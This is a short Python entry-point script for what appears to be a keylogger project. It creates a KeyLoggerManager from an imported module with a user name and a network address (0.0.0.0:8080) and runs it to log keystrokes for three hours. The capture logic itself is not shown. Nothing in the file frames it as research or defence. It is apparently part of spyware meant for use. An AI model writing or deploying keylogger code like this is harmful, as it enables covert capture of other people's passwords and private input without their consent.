import manager
hour = 60*60
#amount of hours to log for
log_hours = 3
def main():
    program = manager.KeyLoggerManager(hour, "woodrow", "0.0.0.0:8080")
    for i in range(log_hours):
        program.run()
if __name__ == "__main__":
    main()